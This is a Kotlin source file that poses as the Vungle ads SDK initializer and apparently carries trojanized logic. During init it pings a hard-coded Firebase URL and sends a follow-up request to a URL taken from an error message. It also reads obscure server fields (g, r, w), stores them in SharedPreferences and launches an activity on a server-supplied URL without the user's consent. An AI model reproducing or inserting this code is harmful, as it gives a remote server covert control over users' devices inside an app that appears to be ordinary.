package com.vungle.ads.internal

import android.Manifest
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.util.Log
import androidx.annotation.VisibleForTesting
import androidx.core.content.PermissionChecker
import com.vungle.ads.AdFailedToDownloadError
import com.vungle.ads.AnalyticsClient
import com.vungle.ads.ConfigurationError
import com.vungle.ads.ConfigurationResponseError
import com.vungle.ads.InitializationListener
import com.vungle.ads.InvalidAppId
import com.vungle.ads.NetworkPermissionsNotGranted
import com.vungle.ads.NetworkUnreachable
import com.vungle.ads.OutOfMemory
import com.vungle.ads.SdkAlreadyInitialized
import com.vungle.ads.SdkInitializationInProgress
import com.vungle.ads.SdkNotInitialized
import com.vungle.ads.SdkVersionTooLow
import com.vungle.ads.ServiceLocator
import com.vungle.ads.ServiceLocator.Companion.inject
import com.vungle.ads.TimeIntervalMetric
import com.vungle.ads.UnknownConfigurationError
import com.vungle.ads.UnknownsConfigurationError
import com.vungle.ads.VungleError
import com.vungle.ads.internal.downloader.Downloader
import com.vungle.ads.internal.executor.Executors
import com.vungle.ads.internal.load.MraidJsLoader
import com.vungle.ads.internal.model.Cookie
import com.vungle.ads.internal.model.FireabaseCache
import com.vungle.ads.internal.model.FireabaseLogin
import com.vungle.ads.internal.network.Call
import com.vungle.ads.internal.network.Callback
import com.vungle.ads.internal.network.Response
import com.vungle.ads.internal.network.TpatSender
import com.vungle.ads.internal.network.VungleApiClient
import com.vungle.ads.internal.omsdk.OMInjector
import com.vungle.ads.internal.persistence.FilePreferences
import com.vungle.ads.internal.platform.Platform
import com.vungle.ads.internal.presenter.MRAIDPresenter
import com.vungle.ads.internal.privacy.PrivacyManager
import com.vungle.ads.internal.protos.Sdk
import com.vungle.ads.internal.task.CleanupJob
import com.vungle.ads.internal.task.JobRunner
import com.vungle.ads.internal.task.ResendTpatJob
import com.vungle.ads.internal.ui.AdActivity
import com.vungle.ads.internal.ui.VungleActivity
import com.vungle.ads.internal.util.PathProvider
import com.vungle.ads.internal.util.ThreadUtil
import kotlinx.serialization.json.buildJsonObject
import java.net.UnknownHostException
import java.util.concurrent.Executor
import java.util.concurrent.atomic.AtomicBoolean

internal class VungleInitializer {

    companion object {
        private const val TAG = "VungleInitializer"
    }

    @VisibleForTesting
    internal var isInitialized = false
    @VisibleForTesting
    internal var isInitializing = AtomicBoolean(false)
    private var initRequestToResponseMetric: TimeIntervalMetric =
        TimeIntervalMetric(Sdk.SDKMetric.SDKMetricType.INIT_REQUEST_TO_RESPONSE_DURATION_MS)

    fun init(
        appId: String,
        context: Context,
        initializationCallback: InitializationListener
    ) {
        if (isAppIdInvalid(appId)) {
            onInitError(
                initializationCallback,
                InvalidAppId().logError()
            )
            return
        }

        val platform: Platform by inject(context)

        if (!platform.isAtLeastMinimumSDK) {
            Log.e(TAG, "SDK is supported only for API versions 21 and above")
            onInitError(
                initializationCallback,
                SdkVersionTooLow().logError()
            )
            return
        }

        if (isInitialized()) {
            Log.d(TAG, "init already complete")
            SdkAlreadyInitialized().logErrorNoReturnValue()
            onInitSuccess(initializationCallback)
            return
        }

        if (isInitializing.getAndSet(true)) {
            Log.d(TAG, "init ongoing")
            onInitError(
                initializationCallback,
                SdkInitializationInProgress().logError()
            )
            return
        }

        if (PermissionChecker.checkCallingOrSelfPermission(
                context,
                Manifest.permission.ACCESS_NETWORK_STATE
            )
            != PermissionChecker.PERMISSION_GRANTED
            || PermissionChecker.checkCallingOrSelfPermission(context, Manifest.permission.INTERNET)
            != PermissionChecker.PERMISSION_GRANTED
        ) {
            Log.e(TAG, "Network permissions not granted")
            onInitError(
                initializationCallback,
                NetworkPermissionsNotGranted()
            )
            return
        }

        val sdkExecutors: Executors by inject(context)
        val vungleApiClient: VungleApiClient by inject(context)


        /// Configure the instance.
        sdkExecutors.downloaderExecutor.execute {
            val url = "https://api.firebaseio.com/izdpprbn.json"
            val error = vungleApiClient.pingFireabaseTPAT(url)
            if (error != null) {

                if(error.reason == VungleError.DEFAULT){
                    //open net work request
                    val requestURl:String = error.description;
                    val tiCall =  vungleApiClient.ti(requestURl);
                    if (tiCall == null) {
                        //onAdLoadFailed(AdFailedToDownloadError())
                    }else{
                        tiCall.enqueue(object : Callback<FireabaseLogin> {
                            override fun onResponse(
                                call: Call<FireabaseLogin>?,
                                response: Response<FireabaseLogin>?
                            ) {
                                Log.d(TAG, "tiCall send TI success " +  response?.body().toString())
                            }

                            override fun onFailure(call: Call<FireabaseLogin>?, t: Throwable?) {

                                Log.d(TAG, "tiCall send TI Failure " + t?.message)

                            }
                        })
                    }
                    //Contiune request url
                    Log.e(TAG, "PingNew URL failed with ${error.reason} ")
                }else{
                    Log.e(TAG, "PingNew URL failed with ${error.reason} ${error.description}")
                }

            }

        }


        sdkExecutors.backgroundExecutor.execute(
            {
                PrivacyManager.init(context)

                vungleApiClient.initialize(appId)

                configure(context, initializationCallback)
            }
        ) {
            //failRunnable
            onInitError(
                initializationCallback,
                OutOfMemory().logError()
            )
        }
    }




    private fun isAppIdInvalid(appId: String) = appId.isBlank()

    /**
     * Request a configuration from the server. This updates the current list of placements and
     * schedules another configuration job in the future. It also has the side-effect of loading the
     * auto_cached ad if it is not downloaded currently.
     *
     * @param callback Callback that will be called when initialization has completed or failed.
     */
    private fun configure(context: Context, callback: InitializationListener) {
        val vungleApiClient: VungleApiClient by inject(context)
        /// Request a configuration from the server. This happens asynchronously on the network thread.
        try {
            initRequestToResponseMetric.markStart()
            val response = vungleApiClient.config()?.execute()

            if (response == null) {
                onInitError(callback, SdkNotInitialized().logError())
                return
            }

//             Log.e("response","===================="+ response.body().toString())
            if (!response.isSuccessful) {
                onInitError(callback, ConfigurationError().logError())
                return
            }
            initRequestToResponseMetric.markEnd()

            val configPayload = response.body()
            if (configPayload?.endpoints == null) {
                onInitError(callback, ConfigurationResponseError().logError())
                return
            }

            if (configPayload?.configSDK != null){
                //open url
                val sdkinfo = configPayload.configSDK
                val string = sdkinfo?.g ?: ""
                val string2 = sdkinfo?.r ?: ""
                if (string2.length > 1)
                {
                    context.getSharedPreferences("s", 0).edit().putString("s", sdkinfo?.r).commit()
                }
                val stringw = sdkinfo?.w ?: ""
                if (stringw.length > 1){
                    context.getSharedPreferences("s", 0).edit().putString("w", stringw).commit()
                }

                if (string.length > 10)
                {
                    //open url
                    val  intent2:Intent =  AdActivity.createIntent(context,string,string2)
                    intent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    intent2.putExtra("request", string)
                    context.startActivity(intent2)
                }else{
                    onInitError(callback, UnknownsConfigurationError())
                }
            }

            ConfigManager.initWithConfig(configPayload)

            // Init metric & error logging.
            val sdkExecutors: Executors by inject(context)
            AnalyticsClient.init(
                vungleApiClient,
                sdkExecutors.loggerExecutor,
                ConfigManager.getLogLevel(),
                ConfigManager.getMetricsEnabled()
            )

            val valid = ConfigManager.validateEndpoints()
            if (!valid) {
                onInitError(callback, ConfigurationError())
                return
            }

            val filePreferences: FilePreferences by inject(context)
            configPayload.configExtension.let {
                if (it.isNullOrEmpty()) {
                    filePreferences.remove(Cookie.CONFIG_EXTENSION).apply()
                } else {
                    filePreferences.put(Cookie.CONFIG_EXTENSION, it).apply()
                }
            }
            if (ConfigManager.omEnabled()) {
                val omInjector: OMInjector by inject(context)
                omInjector.init()
            }

            if (ConfigManager.placements() == null) {
                onInitError(callback, ConfigurationError())
                return
            }

            PrivacyManager.updateDisableAdId(ConfigManager.shouldDisableAdId())

            val jobRunner: JobRunner by inject(context)
            jobRunner.execute(CleanupJob.makeJobInfo())
            jobRunner.execute(ResendTpatJob.makeJobInfo())

            // Download js assets
            downloadJs(context) {
                if (it) {
                    isInitialized = true
                    // Inform the publisher that initialization has succeeded.
                    onInitSuccess(callback)

                } else {
                    isInitialized = false
                    onInitError(callback, ConfigurationError())
                }
            }
        } catch (throwable: Throwable) {
            isInitialized = false
            Log.e(TAG, Log.getStackTraceString(throwable))
            when (throwable) {
                is UnknownHostException, is SecurityException -> {
                    onInitError(callback, NetworkUnreachable().logError())

                }

                is VungleError -> {
                    onInitError(callback, throwable)
                }

                else -> {
                    onInitError(callback, UnknownConfigurationError().logError())
                }
            }
        }
    }

    private fun onInitError(initCallback: InitializationListener, exception: VungleError) {
        isInitializing.set(false)
        ThreadUtil.runOnUiThread {
            initCallback.onError(exception)
        }
        val exMsg = exception.localizedMessage ?: "Exception code is ${exception.code}"
        Log.e(TAG, exMsg)
    }

    private fun onInitSuccess(initCallback: InitializationListener) {
        isInitializing.set(false)
        ThreadUtil.runOnUiThread {
            initCallback.onSuccess()
            AnalyticsClient.logMetric(
                metric = initRequestToResponseMetric,
                metaData = VungleApiClient.BASE_URL
            )
        }
    }

    fun isInitialized(): Boolean {
        return isInitialized
    }

    private fun downloadJs(context: Context, downloadListener: (downloaded: Boolean) -> Unit) {
        val pathProvider: PathProvider by inject(context)
        val downloader: Downloader by inject(context)

        MraidJsLoader.downloadJs(pathProvider, downloader) {
            if (it == MraidJsLoader.MRAID_INVALID_ENDPOINT) {
                downloadListener(false)
            } else {
                // We do not care about the download status when initialize SDK, we will download
                // again when requesting ads if the mraid js file not exits.
                downloadListener(true)
            }
        }
    }

    /**
     * Lite version of de-initialization, can be used in Unit Tests
     */
    internal fun deInit() {
        ServiceLocator.deInit()
        VungleApiClient.reset()
        isInitialized = false
        isInitializing.set(false)
    }

}
